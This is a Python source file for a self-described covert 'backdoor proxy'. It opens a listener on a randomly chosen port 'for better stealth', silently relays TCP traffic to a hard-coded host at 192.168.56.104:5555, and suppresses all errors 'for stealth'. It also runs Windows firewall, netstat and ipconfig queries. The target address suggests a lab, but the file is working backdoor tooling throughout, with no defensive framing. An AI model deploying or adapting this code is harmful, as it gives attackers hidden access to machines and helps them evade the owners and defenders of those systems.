import socket
import threading
import time
import json
import select
import random
from datetime import datetime
import subprocess
import os


class HiddenChannel:
    """Hidden proxy channel for covert backdoor access"""

    def __init__(self, listen_port=None, target_host='192.168.56.104', target_port=5555):
        # Port will be set during initialization to ensure availability
        self.listen_port = listen_port  # Don't generate random port yet
        self.target_host = target_host
        self.target_port = target_port
        self.is_running = False
        self.channel_socket = None
        self.channel_thread = None
        self.connections = {}  # Track active connections
        self.connection_count = 0
        self.start_time = None
        
    def create_stealth_socket(self):
        """Create socket with stealth configurations"""
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Socket options for stealth
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to bind to the port
            sock.bind(('0.0.0.0', self.listen_port))
            sock.listen(5)
            
            return sock
        except Exception as e:
            return None
    
    def handle_client_connection(self, client_socket, client_address):
        """Handle individual client connection through proxy channel"""
        connection_id = f"conn_{self.connection_count}"
        self.connection_count += 1
        target_socket = None
        
        try:
            # Create connection to target
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.settimeout(5)  # Add timeout
            target_socket.connect((self.target_host, self.target_port))
            
            # Store connection info
            self.connections[connection_id] = {
                'client_addr': client_address,
                'start_time': datetime.now(),
                'bytes_sent': 0,
                'bytes_received': 0
            }
            
            # Start bidirectional data forwarding
            client_thread = threading.Thread(
                target=self.forward_data, 
                args=(client_socket, target_socket, connection_id, 'client_to_target'),
                daemon=True
            )
            target_thread = threading.Thread(
                target=self.forward_data, 
                args=(target_socket, client_socket, connection_id, 'target_to_client'),
                daemon=True
            )
            
            client_thread.start()
            target_thread.start()
            
            # Wait for connection to end naturally instead of blocking with join()
            while (self.is_running and 
                   client_thread.is_alive() and 
                   target_thread.is_alive()):
                time.sleep(0.1)
            
        except Exception as e:
            pass  # Silent failure for stealth
        finally:
            try:
                client_socket.close()
            except:
                pass
            try:
                if target_socket:
                    target_socket.close()
            except:
                pass
            if connection_id in self.connections:
                del self.connections[connection_id]
    
    def forward_data(self, source_socket, destination_socket, connection_id, direction):
        """Forward data between sockets"""
        try:
            while self.is_running:
                # Use select for non-blocking check with longer timeout
                ready = select.select([source_socket], [], [], 1.0)
                if ready[0]:
                    try:
                        data = source_socket.recv(4096)
                        if not data:
                            break  # Connection closed
                        
                        destination_socket.send(data)
                        
                        # Update connection stats
                        if connection_id in self.connections:
                            if direction == 'client_to_target':
                                self.connections[connection_id]['bytes_sent'] += len(data)
                            else:
                                self.connections[connection_id]['bytes_received'] += len(data)
                                
                    except socket.error:
                        break  # Socket error, exit loop
                
        except Exception as e:
            pass  # Silent failure
        # Don't close sockets here - let handle_client_connection do it
    
    def proxy_server_loop(self):
        """Main proxy server loop"""
        try:
            self.channel_socket = self.create_stealth_socket()
            if not self.channel_socket:
                return
            
            self.is_running = True
            self.start_time = datetime.now()
            
            while self.is_running:
                try:
                    # Accept connections with timeout
                    self.channel_socket.settimeout(1.0)
                    client_socket, client_address = self.channel_socket.accept()
                    
                    # Handle connection in separate thread
                    connection_thread = threading.Thread(
                        target=self.handle_client_connection,
                        args=(client_socket, client_address),
                        daemon=True
                    )
                    connection_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.is_running:
                        time.sleep(1)  # Brief pause before retry
                        
        except Exception as e:
            pass  # Silent failure for stealth
        finally:
            if self.channel_socket:
                try:
                    self.channel_socket.close()
                except:
                    pass
    
    def start_proxy_channel(self):
        """Start the proxy channel"""
        if self.is_running:
            return False, "proxy channel already running"
        
        # Test if target is reachable
        if not self.test_target_connection():
            return False, f"Cannot reach target {self.target_host}:{self.target_port}"
        
        # Start proxy channel in background thread
        self.channel_thread = threading.Thread(target=self.proxy_server_loop, daemon=True)
        self.channel_thread.start()
        
        # Give it a moment to start
        time.sleep(0.5)
        
        if self.is_running:
            return True, f"proxy channel started on port {self.listen_port}"
        else:
            return False, "Failed to start proxy channel"
    
    def stop_proxy_channel(self):
        """Stop the proxy channel"""
        if not self.is_running:
            return False, "proxy channel not running"
        
        self.is_running = False
        
        # Close main socket
        if self.channel_socket:
            try:
                self.channel_socket.close()
            except:
                pass
        
        # Wait for thread to finish
        if self.channel_thread:
            self.channel_thread.join(timeout=3)
        
        return True, f"proxy channel stopped"
    
    def test_target_connection(self):
        """Test if target server is reachable"""
        try:
            test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            test_socket.settimeout(2)
            result = test_socket.connect_ex((self.target_host, self.target_port))
            test_socket.close()
            return result == 0
        except:
            return False
    
    def get_proxy_status(self):
        """Get current proxy status and statistics"""
        status = {
            'is_running': self.is_running,
            'listen_port': self.listen_port,
            'target_host': self.target_host,
            'target_port': self.target_port,
            'start_time': self.start_time.isoformat() if self.start_time else None,
            'active_connections': len(self.connections),
            'total_connections': self.connection_count,
            'uptime_seconds': (datetime.now() - self.start_time).total_seconds() if self.start_time else 0
        }
        
        return status
    



class proxyManager:
    """Manage proxy mechanisms for the hidden channel"""
    
    def __init__(self, channel_instance):
        self.channel = channel_instance
    
    def check_firewall_status(self):
        """Check Windows firewall status (informational)"""
        try:
            result = subprocess.run(
                ['netsh', 'advfirewall', 'show', 'allprofiles', 'state'],
                capture_output=True, text=True, timeout=10
            )
            return result.returncode == 0, result.stdout
        except Exception as e:
            return False, str(e)
    
    def check_port_usage(self, port=None):
        """Check if port is already in use"""
        if port is None:
            port = self.channel.listen_port
            
        try:
            result = subprocess.run(
                ['netstat', '-an'],
                capture_output=True, text=True, timeout=5
            )
            
            if result.returncode == 0:
                port_str = f":{port}"
                lines = result.stdout.split('\n')
                for line in lines:
                    if port_str in line and 'LISTENING' in line:
                        return True, f"Port {port} is already in use"
                
                return False, f"Port {port} is available"
            else:
                return None, "Could not check port status"
                
        except Exception as e:
            return None, f"Error checking port: {str(e)}"
    
    def find_available_port(self, start_port=8000, end_port=9999):
        """Find an available port in the given range"""
        for port in range(start_port, end_port + 1):
            in_use, msg = self.check_port_usage(port)
            if in_use == False:  # Port is available
                return port
        
        return None
    
    def get_network_info(self):
        """Get network interface information"""
        try:
            result = subprocess.run(
                ['ipconfig', '/all'],
                capture_output=True, text=True, timeout=10
            )
            
            if result.returncode == 0:
                return True, result.stdout
            else:
                return False, "Could not retrieve network info"
                
        except Exception as e:
            return False, f"Network info error: {str(e)}"


class Backdoorproxy:
    """Main manager for backdoor proxy operations"""
    
    def __init__(self, target_host='192.168.56.104', target_port=5555):
        self.target_host = target_host
        self.target_port = target_port
        self.channel = None
        self.proxy_mgr = None
    
    def initialize_proxy(self, listen_port=None):
        """Initialize the proxy channel"""
        self.channel = HiddenChannel(listen_port, self.target_host, self.target_port)
        self.proxy_mgr = proxyManager(self.channel)
        
        # Find available port if none specified
        if listen_port is None:
            # Try random ports until we find an available one
            max_attempts = 10
            for attempt in range(max_attempts):
                random_port = random.randint(8000, 9999)
                in_use, port_msg = self.proxy_mgr.check_port_usage(random_port)
                if in_use == False:  # Port is available
                    self.channel.listen_port = random_port
                    break
            else:
                # If no random port found, use find_available_port as fallback
                available_port = self.proxy_mgr.find_available_port()
                if available_port:
                    self.channel.listen_port = available_port
                else:
                    return False, "No available ports found"
        
        return True, f"proxy initialized on port {self.channel.listen_port}"
    
    def start_proxy_operations(self):
        """Start proxy operations with automatic new random port selection"""
        # Always reinitialize with a new random port for better stealth
        success, msg = self.initialize_proxy()
        if not success:
            return False, msg
        
        # Start the proxy channel
        return self.channel.start_proxy_channel()
    

    
    def stop_proxy_operations(self):
        """Stop proxy operations"""
        if self.channel:
            return self.channel.stop_proxy_channel()
        else:
            return False, "No proxy channel found"
    
    def get_proxy_status(self):
        """Get comprehensive proxy status"""
        if not self.channel:
            return {'error': 'proxy not initialized'}
        
        channel_status = self.channel.get_proxy_status()
        
        # Add system information
        in_use, port_msg = self.proxy_mgr.check_port_usage()
        
        status = {
            'proxy': channel_status,
            'port_status': port_msg,
            'target_reachable': self.channel.test_target_connection(),
            'system_time': datetime.now().isoformat()
        }
        
        return status
    



# Factory function to create backdoor proxy manager
def create_backdoor_proxy(target_host='192.168.56.104', target_port=5555):
    """Create backdoor proxy manager instance"""
    return Backdoorproxy(target_host, target_port)


# Test the proxy functionality
if __name__ == "__main__":
    print("Testing Backdoor proxy System...")
    
    # Create proxy manager
    persist_mgr = create_backdoor_proxy()
    
    # Initialize proxy
    success, msg = persist_mgr.initialize_proxy()
    print(f"Initialize: {msg}")
    
    if success:
        # Get initial status
        status = persist_mgr.get_proxy_status()
        print(f"\nInitial Status:")
        print(f"  proxy Port: {status['proxy']['listen_port']}")
        print(f"  Target: {status['proxy']['target_host']}:{status['proxy']['target_port']}")
        print(f"  Port Available: {status['port_status']}")
        print(f"  Target Reachable: {status['target_reachable']}")
        
        # Test starting the proxy
        print(f"\nTesting proxy start...")
        success, msg = persist_mgr.start_proxy_operations()
        print(f"Start result: {msg}")
        
        if success:
            # Show running status
            time.sleep(1)
            status = persist_mgr.get_proxy_status()
            print(f"\nRunning Status:")
            print(f"  Is Running: {status['proxy']['is_running']}")
            print(f"  Uptime: {status['proxy']['uptime_seconds']:.1f} seconds")
            print(f"  Active Connections: {status['proxy']['active_connections']}")
            
            # Test stopping
            time.sleep(2)
            success, msg = persist_mgr.stop_proxy_operations()
            print(f"\nStop result: {msg}")
    
    print("\nproxy test completed!")